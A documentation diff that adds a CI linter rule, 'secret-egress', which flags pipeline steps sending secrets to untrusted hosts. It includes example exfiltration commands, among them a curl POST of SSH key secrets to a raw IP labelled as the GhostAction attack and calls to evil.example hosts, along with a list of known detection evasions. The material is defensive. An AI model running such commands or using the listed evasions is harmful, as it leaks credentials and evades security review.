@@ -59,6 +59,7 @@ reading the upstream docs.
 | [ISSUE-310](#issue-310--artipacked-exfiltrated) | `artipacked-exfiltrated` | high |
 | [ISSUE-308](#issue-308--secrets-dynamic-index) | `secrets-dynamic-index` | low |
 | [ISSUE-309](#issue-309--overprovisioned-secrets) | `overprovisioned-secrets` | **critical** |
+| [ISSUE-311](#issue-311--secret-egress) | `secret-egress` | **critical** |
 
 ### Triggers & composition — `4xx`
 
@@ -1464,6 +1465,175 @@ and must never be reused: the downstream jobs platform has mapped
 "secret leak in pipeline configuration" to 301 since before the CLI
 rule existed. Configs still carrying the control key get a
 "removed and ignored" warning.
+
+---
+
+## ISSUE-311 — `secret-egress`
+
+**Severity:** `critical` • **Control:** `pipelineMustNotSendSecretsToUntrustedHosts`
+
+A `run:` step hands a secret to a network client aimed at a host the
+policy does not trust. This is the GhostAction shape (GitGuardian, 2025
+and 2026): an injected workflow whose single step posts repository
+secrets to an attacker address. One finding per job and destination.
+
+### What the rule reads
+
+Three things in one command of a script line (a line whose first
+non-blank character is `#` is a shell comment and is skipped whole, before
+continuations are joined, so a `#` line ending in a backslash does not
+hide the next line). A line is split into commands on unquoted `&&`,
+`||`, `;`, `&` and `|`, so `curl -fsSL https://deb.nodesource.com/setup_20.x
+| bash - && npm publish --token ${{ secrets.NPM_TOKEN }}` sends the token
+to no curl destination; a secret in an earlier command of the same pipe
+(`echo "$K" | curl -d @- https://...`) does reach the client. A `$(...)`
+or backtick substitution, quoted or not, is a command of its own: a
+secret outside it never reaches a client inside it (`deploy --token $K
+--config $(curl https://cfg.example/prod.json)` is silent), a client
+inside it with its own secret is read (`T=$(curl -d "$K"
+https://evil.example/x)`), and a secret inside it that feeds the command
+around it reaches that command's client, even when the inner command is
+itself a client aimed elsewhere (`curl "https://evil.example/x?v=$(curl
+-H "X: $K" https://api.github.com/y)"` names `K` at `evil.example`):
+
+- a network client (`curl`, `wget`, `nc`/`ncat`/`netcat`,
+  `Invoke-WebRequest`/`Invoke-RestMethod`/`iwr`/`irm`, httpie
+  `http`/`https`, with or without a Windows `.exe` suffix such as
+  `curl.exe`, and also when called by its path (`/usr/bin/curl`,
+  `./curl`, `C:\tools\curl.exe`), escaped (`\curl`) or quoted at the
+  start of a command (`"curl" ...`); a word that only ends in a client
+  name, such as `mycurl` or `curlx`, is not one), read on the
+  comment-stripped line; `git` too (also by path, such as
+  `/usr/bin/git`), with a
+  narrower rule: only a secret in the userinfo of an http(s) remote URL
+  (`git push https://x:$TOKEN@host/r.git`, sent to that URL's host) or in
+  a `-c http.[<url>.]extraheader=...` value (sent to the command's remote
+  URLs) counts, never a secret elsewhere on a git command;
+- a secret: `${{ secrets.NAME }}`, or `$NAME`/`${NAME}`/`$env:NAME`
+  (any case, as in PowerShell)/`%NAME%`/`${{ env.NAME }}` where NAME is
+  an env key bound to `${{ secrets.* }}` at workflow, job or step level;
+- a literal destination, once a trailing unquoted shell comment is cut:
+  every `http(s)://host[:port]` (a bracketed IPv6 literal such as
+  `http://[2606:4700::1111]/` included), every bare IPv4, and every
+  schemeless host: a dotted name whose last label is alphabetic, taken
+  when it is the first positional argument of a client, past flags, the
+  word after any flag not known to be value-less (`-o out.txt`,
+  `--cert client.pem`, `-H "..."`; known value-less flags such as `-s`,
+  `-sSfL`, `-q` or `-v` take no word), a bare number and an HTTP method
+  word (`nc exfil.example 4444`, `curl -sSfL exfil.example`,
+  `nc -w 3 exfil.example 4444`, `http -v POST exfil.example`), or when
+  it is the value of a flag that names the destination (`curl --url
+  exfil.example`, `irm -Uri exfil.example`), or when it carries a path or
+  a port (`exfil.example/collect`, `exfil.example:8443`). The positional host
+  is read only when the line has no URL or IP destination, so a download
+  such as `curl --output artifacts.zip ... "$CI_API_V4_URL/..."` never
+  reads its file name as a host. A host inside a flag's value is not a
+  destination: a proxy (`-x proxy.corp.example:3128`), a `--resolve`
+  map or a header (`-H "Host: lb.internal:8443"`) names where the client
+  does not connect; only the value of `--url` or `-Uri`, and an http(s)
+  URL or IP literal after a flag that is not a proxy, resolve,
+  connect-to, interface, DNS, referer or header flag, still count.
+  Trusted when it
+  matches a `trustedHosts` glob or, with `trustVcsHosts`, is
+  `github.com`, `api.github.com`, `uploads.github.com`, `ghcr.io` or
+  `*.githubusercontent.com`; on GitHub Enterprise Server the instance
+  host (from `--github-url` or the git remote) and its subdomains are VCS
+  hosts too. A glob is matched on `host[:port]`, so a glob without a
+  port does not cover the same host with a port: add a `host:*` entry
+  for that. A glob whose first label is numeric (`10.*`, `192.168.*`)
+  matches IP literals only, never a hostname such as
+  `10.attacker.example`. An IP, IPv4 or IPv6, is trusted only through
+  `trustedHosts`. Write an IPv6 entry with or without brackets
+  (`2606:4700::1111` or `[2606:4700::1111]`), or as a glob on the
+  unbracketed address (`2606:4700:*`, which also covers any port); such
+  an entry matches IPv6 literals only, never a hostname. A secret in the URL's userinfo
+  (`https://$TOKEN@host/...`) still counts as sent, and the destination
+  is the host after the last `@`.
+
+```yaml
+# ❌ the GhostAction workflow
+- run: |
+    curl -s -X POST -d 'VPS_HOST=${{ secrets.VPS_HOST }}&VPS_SSH_KEY=${{ secrets.VPS_SSH_KEY }}' http://193.32.204.199
+
+# ❌ the secret arrives through env
+- env:
+    TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+  run: curl -H "Authorization: Bearer $TOKEN" https://collector.evil.example/ping
+```
+
+### Silent by design
+
+```yaml
+# ✅ the VCS itself
+- run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/o/r/issues/1/comments
+
+# ✅ an allowlisted host (trustedHosts: ["*.internal.example.com"])
+- run: curl -d "k=${{ secrets.KEY }}" https://deploy.internal.example.com/hook
+
+# ✅ loopback or the job's own service container: the secret stays on the
+#    runner (localhost, 127.0.0.0/8, [::1], a single-label host such as docker or postgres)
+- run: curl -H "Authorization: Bearer ${{ secrets.KEY }}" http://localhost:3000/api
+
+# silent, not judged: the destination is a variable the rule cannot resolve
+- run: curl -d "token=${{ secrets.HOOK_TOKEN }}" "$WEBHOOK_URL"
+
+# silent: a secret with no network client, or a client with no secret
+- run: echo "deploying with ${{ secrets.KEY }}" > /dev/null
+- run: curl -sSf https://example.com/healthz
+```
+
+**Config.**
+
+```yaml
+pipelineMustNotSendSecretsToUntrustedHosts:
+  enabled: true
+  trustVcsHosts: true
+  trustedHosts: []
+```
+
+**Limits.** A destination held in a variable is never judged; a secret
+copied into a file or a shell variable and used by a later command is not
+seen (one command at a time: `export T="$K" && curl -d "$T" https://evil.example/x`
+is silent, since `&&` cuts the flow and only a pipe carries a secret
+forward); a command split with a trailing backslash is joined into one
+line first, so a continuation is read the same as a single line; on
+GitLab the masked flags come from the settings-variables lane, so
+without a token the control reports not-evaluable. Known evasions,
+accepted: a client word quoted anywhere but at the start of a command
+(`sudo "curl" ...`) is not seen as a client; a schemeless argument that
+ends in a client word (`charts.example/wget`) is read as a client called
+by its path, while a URL (`https://charts.example/wget`) never is;
+`scp`, `rsync`, `ssh` and
+other transfer tools are not clients; quote
+juggling that makes the line look like it ends in a comment can hide the
+client; an internationalized (IDN) host yields no destination; a
+four-part version string in the data (`"tag":"1.2.3.4"`) is read as an
+IP destination; the trailing-comment cut reads shell syntax, so an escaped
+space before the `#` (`x\ #y https://evil.example`) or a `#` in a
+`shell: cmd` step hides the destination that follows it; a bare dotted
+host that is neither the client's first argument nor carries a path or a
+port (`curl -d "x" exfil.example` as the last argument) is not read as a
+destination, because it cannot be told from a file name (`-o out.txt`);
+on a line that already holds a client and a secret, a dotted word with a
+port or a path is read as a host even when it is not one (`README.md:12`,
+`golang.org/x/tools`), a false positive accepted for the shape; a `#`
+line is dropped even when it is really the continuation of a string
+quoted on the line above, which can hide that string's rest; a trailing
+comment ending in a backslash (`echo hi # old \`) still swallows the
+next line; the positional host is skipped when its command holds any URL
+or IP outside a flag's value, so a decoy URL argument in the same command
+(`curl -s exfil.example -d "$K" https://github.com/`) hides it; a flag
+the rule does not know as value-less is assumed to take a value, so a
+hostname right after an unknown boolean flag is not read (a URL or an IP
+there still is); a bare URL given as data to a trusted call (`-d
+"https://hooks.example/cb" https://api.github.com/x`) is read as a
+destination; a proxy set by an environment prefix
+(`https_proxy=http://proxy.example:3128 curl ...`) is read as a
+destination; a `--connect-to api.github.com:443:evil.example:443`
+redirect is not seen; the command split
+is best effort (a substitution nested three deep, a `[[ ]]` test or an
+unbalanced quote can cut a command in the wrong place, and an apostrophe
+inside a double-quoted string can hide a substitution after it).
 
 ---
 
